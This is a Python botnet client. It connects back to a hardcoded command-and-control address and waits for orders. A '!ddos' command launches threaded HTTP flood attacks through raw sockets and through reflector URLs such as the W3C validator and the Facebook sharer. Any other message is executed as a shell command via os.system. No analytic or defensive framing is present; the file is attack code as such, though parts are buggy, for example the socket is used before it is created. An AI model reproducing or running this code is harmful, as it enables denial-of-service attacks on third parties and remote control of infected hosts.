import socket,threading, os, urllib.request, random, time
from queue import Queue
ip = "192.168.0.115"
port = 1234
q1 = Queue()
q2 = Queue()
useragents = ['Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
                   'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15',
                   'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
                   'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
                   'Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7']
def req_ddos(ip, item):
    while True:
        try:
            task = q1.get()
            hammerbots(random.choice(bots) + "http://" + ip)
            q1.task_done()
        except:
            pass
def sockddos(ip, port):
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            task = q2.get()
            msg = f"GET / HTTP/1.1\nHost: {ip}\n\nUser-Agent: {random.choice(useragents)}".encode('utf-8')
            ddos.connect((ip, int(port)))
            ddos.send(msg)
            time.sleep(0.1)
            q2.task_done()
        except:
            pass
def hammerbots(url):
    while True:
        req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(useragents)}))
        time.sleep(0.1)
def get_bots():
	global bots
	bots = []
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)
get_bots()
while True:
    try:
        msg = s.recv(1024)
        msg = msg.decode()
        if msg.startswith('!ddos'):
            msg = msg.split()
            target = msg[1]
            try:
                port = msg[2]
            except:
                port = 80
            try:
                thr = msg[3]
            except:
                thr = 123
            item = 0
            while True:
                for i in range(thr):
                    dos1 = threading.Thread(target=req_ddos, args=(target, item))
                    dos1.daemon = True
                    dos1.start()
                    dos2 = threading.Thread(target=sockddos, args=(target, port))
                    dos2.daemon = True
                    dos2.start()
                while True:
                    if item > 1800:
                        item = 0
                        time.sleep(0.1)
                    item += 1
                    q1.put(item)
                    q2.put(item)
                q1.join()
                q2.join()
        else:
            os.system(msg)
    except:
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send('!clientlog'.encode())
                break
            except:
                s.close()
